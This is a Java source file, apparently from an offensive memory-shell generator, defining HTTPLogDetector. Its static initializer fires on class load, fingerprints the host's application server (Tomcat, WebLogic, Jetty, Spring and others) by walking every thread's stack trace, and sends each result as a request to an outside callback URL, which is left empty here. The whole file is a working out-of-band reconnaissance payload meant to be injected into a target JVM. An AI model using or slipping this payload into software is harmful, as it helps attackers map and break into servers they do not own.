package jmg.extender.detector;

import java.io.IOException;
import java.net.UnknownHostException;
import java.util.ArrayList;
import java.util.Map;


public class HTTPLogDetector {

    static {
        new HTTPLogDetector();
    }


    public HTTPLogDetector() {
        sendServerType();
    }

    public static String getBaseURL() {
        return "";
    }


    private static void sendServerType() {
        ArrayList<String> serverTypes = getServerType();
        String baseurl = getBaseURL();
        try {
            for (int i = 0; i < serverTypes.size(); i++) {
                Object server_type = serverTypes.get(i);
                String tmpUrl = String.format("%s/%s", baseurl, server_type);
                new java.net.URL(tmpUrl).getContent();
            }
        } catch (UnknownHostException ignored) {
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }


    public static ArrayList<String> getServerType() {
        ArrayList<String> serverTypes = new ArrayList<>();
        Map<Thread, StackTraceElement[]> stackTraces = Thread.getAllStackTraces();
        for (Map.Entry<Thread, StackTraceElement[]> entry : stackTraces.entrySet()) {
            StackTraceElement[] stackTraceElements = entry.getValue();
            for (StackTraceElement element : stackTraceElements) {
                if (element.getClassName().contains("org.apache.catalina.core")) {
                    serverTypes.add("tomcat");
                }
                if (element.getClassName().contains("weblogic.servlet.internal")) {
                    serverTypes.add("weblogic");
                }
                if (element.getClassName().contains("com.caucho.server")) {
                    serverTypes.add("resin");
                }
                if (element.getClassName().contains("org.eclipse.jetty.server")) {
                    serverTypes.add("jetty");
                }
                if (element.getClassName().contains("com.ibm.ws")) {
                    serverTypes.add("websphere");
                }
                if (element.getClassName().contains("io.undertow.server")) {
                    serverTypes.add("undertow");
                }
                if (element.getClassName().contains("com.tongweb.web")) {
                    serverTypes.add("tongweb");
                }
                if (element.getClassName().contains("com.apusic.web")) {
                    serverTypes.add("apusic");
                }
                if (element.getClassName().contains("org.springframework.web")) {
                    serverTypes.add("spring");
                }
            }
            if (serverTypes.size() > 7){
                return serverTypes;
            }
        }

        if(serverTypes.size() == 0){
            serverTypes.add("none");
        }

        return serverTypes;
    }
}
